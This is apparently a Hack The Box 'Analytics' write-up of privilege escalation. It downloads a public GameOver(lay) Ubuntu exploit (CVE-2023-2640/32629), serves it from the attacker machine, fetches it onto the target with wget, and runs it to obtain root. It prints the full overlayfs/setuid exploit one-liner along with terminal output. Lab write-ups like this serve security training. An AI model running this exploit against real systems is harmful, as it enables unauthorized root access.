After researching a bit about the vulnerability, I saw that there was a reddit post about the vulnerability with the machine. https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

I decided to check github to see if there was an automated process and I found the following resource. https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

# Downloading the exploit
```
──(root㉿kali)-[~/Documents/Notes/hackthebox/Analytics]
└─# git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
Cloning into 'CVE-2023-2640-CVE-2023-32629'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (11/11), done.
Receiving objects: 100% (15/15), 4.26 KiB | 871.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.
remote: Total 15 (delta 3), reused 0 (delta 0), pack-reused 0

┌──(root㉿kali)-[~/Documents/Notes/hackthebox/Analytics]
└─# cd CVE-2023-2640-CVE-2023-32629 

┌──(root㉿kali)-[~/…/Notes/hackthebox/Analytics/CVE-2023-2640-CVE-2023-32629]
└─# ls
exploit.sh  README.md

┌──(root㉿kali)-[~/…/Notes/hackthebox/Analytics/CVE-2023-2640-CVE-2023-32629]
└─# chmod +x exploit.sh            

┌──(root㉿kali)-[~/…/Notes/hackthebox/Analytics/CVE-2023-2640-CVE-2023-32629]
└─# ls
exploit.sh  README.md

┌──(root㉿kali)-[~/…/Notes/hackthebox/Analytics/CVE-2023-2640-CVE-2023-32629]
└─# updog -p 80
[+] Serving /root/Documents/Notes/hackthebox/Analytics/CVE-2023-2640-CVE-2023-32629...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.0.107:80
Press CTRL+C to quit
10.10.11.233 - - [11/Oct/2023 20:42:57] "GET /exploit.sh HTTP/1.1" 200 -
```


# Run Exploit

```
metalytics@analytics:/tmp/u$ wget http://10.10.16.79/exploit.sh -O exploit.sh
--2023-10-12 00:42:57--  http://10.10.16.79/exploit.sh
Connecting to 10.10.16.79:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                                 100%[========================================================================================================================================>]     558  --.-KB/s    in 0s      

2023-10-12 00:42:58 (24.7 MB/s) - ‘exploit.sh’ saved [558/558]

metalytics@analytics:/tmp/u$ cat exploit.sh 
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
metalytics@analytics:/tmp/u$ ls
exploit.sh
metalytics@analytics:/tmp/u$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp/u# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```
